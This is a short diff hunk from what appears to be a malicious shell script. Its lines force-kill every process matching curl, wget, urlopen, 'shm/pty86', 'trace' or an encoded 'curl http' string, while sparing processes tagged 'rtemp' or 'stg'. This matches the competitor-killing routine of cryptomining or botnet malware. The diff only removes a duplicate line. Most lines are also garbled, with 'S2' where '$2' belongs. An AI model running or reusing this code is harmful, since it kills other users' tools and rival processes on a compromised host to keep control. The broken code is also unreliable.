@@ -59,7 +59,6 @@ ps aux | grep -v grep | grep 'shm/pty86' | awk '{print S2}'	| xargs -I % kill -9
 ps aux | grep -v grep | grep 'trace' | awk '{print S2}'	| xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'urllib.urlopen' | awk '{print S2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'Y3VybC3odHRw' | awk '{print $2}' | xargs -I % kill -9 %
-ps aux | grep -v grep | grep 'Y3VybC3odHRw' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'curl' | awk '{print S2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'urlopen' | awk '{print $2}'	| xargs -I % kill -9 %
 ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'wget'	| awk '{print S2}'	| xargs -I % kill -9 %
